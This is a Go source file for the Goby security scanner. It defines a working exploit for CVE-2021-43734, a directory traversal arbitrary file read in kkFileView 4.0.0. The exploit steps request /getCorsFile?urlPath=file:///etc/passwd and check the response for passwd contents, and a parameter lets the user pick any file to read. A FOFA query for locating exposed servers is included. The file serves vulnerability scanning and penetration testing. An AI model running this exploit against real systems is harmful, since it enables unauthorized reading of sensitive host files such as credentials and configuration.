package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "kkFileView getCorsFile Api Arbitrary File Read Vulnerability (CVE-2021-43734)",
    "Description": "<p>kkFileView is an online preview solution for file documents. The project is built using the popular spring boot, easy to use and deploy, and basically supports online preview of mainstream office documents, such as doc,docx,xls,xlsx,ppt,pptx,pdf,txt,zip , rar, pictures, video, audio, etc.</p><p>kkFileview v4.0.0 has a directory traversal vulnerability to read arbitrary files, which may lead to the leakage of sensitive files on related hosts.</p>",
    "Impact": "<p>kkFileView Arbitrary File Read Vulnerability (CVE-2021-43734)</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the update of the manufacturer's homepage: <a href=\"https://kkfileview.keking.cn/zh-cn/index.html\">https://kkfileview.keking.cn/zh-cn/index.html</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If it is not necessary, it is forbidden to access the system from the public network.</p>",
    "Product": "kkFileView",
    "VulType": [
        "File Read"
    ],
    "Tags": [
        "File Read"
    ],
    "Translation": {
        "CN": {
            "Name": "kkFileView getCorsFile 接口任意文件读取漏洞（CVE-2021-43734）",
            "Product": "kkFileView",
            "Description": "<p>kkFileView为文件文档在线预览解决方案，该项目使用流行的spring boot搭建，易上手和部署，基本支持主流办公文档的在线预览，如doc,docx,xls,xlsx,ppt,pptx,pdf,txt,zip,rar,图片,视频,音频等等<br></p><p><span style=\"font-size: 16.96px;\">kkFileview v4.0.0 存在通过目录遍历漏洞读取任意文件，可能导致相关主机上的敏感文件泄漏。</span><br></p>",
            "Recommendation": "<p>1、目前没有详细的解决方案提供，请关注厂商主页更新：<a href=\"https://kkfileview.keking.cn/zh-cn/index.html\">https://kkfileview.keking.cn/zh-cn/index.html</a><br></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16.96px;\">kkFileview v4.0.0 存在任意文件读取漏洞，可能导致相关主机上的敏感文件泄漏。</span><br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "kkFileView getCorsFile Api Arbitrary File Read Vulnerability (CVE-2021-43734)",
            "Product": "kkFileView",
            "Description": "<p>kkFileView is an online preview solution for file documents. The project is built using the popular spring boot, easy to use and deploy, and basically supports online preview of mainstream office documents, such as doc,docx,xls,xlsx,ppt,pptx,pdf,txt,zip , rar, pictures, video, audio, etc.<br></p><p>kkFileview v4.0.0 has a directory traversal vulnerability to read arbitrary files, which may lead to the leakage of sensitive files on related hosts.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the update of the manufacturer's homepage: <a href=\"https://kkfileview.keking.cn/zh-cn/index.html\">https://kkfileview.keking.cn/zh-cn/index.html</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If it is not necessary, it is forbidden to access the system from the public network.</p>",
            "Impact": "<p>kkFileView Arbitrary File Read Vulnerability (CVE-2021-43734)</p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "FofaQuery": "body=\"/onlinePreview?url=\"",
    "GobyQuery": "body=\"/onlinePreview?url=\"",
    "Author": "vikkieen",
    "Homepage": "https://kkfileview.keking.cn/zh-cn/index.html",
    "DisclosureDate": "2021-11-14",
    "References": [
        "https://github.com/kekingcn/kkFileView/issues/304"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.5",
    "CVEIDs": [
        "CVE-2021-43734"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202202-1272"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/getCorsFile?urlPath=file:///etc/passwd",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "root:.*:0:0:",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/getCorsFile?urlPath=file:///etc/passwd",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "root:.*:0:0:",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "urlPath",
            "type": "input",
            "value": "/etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10359"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
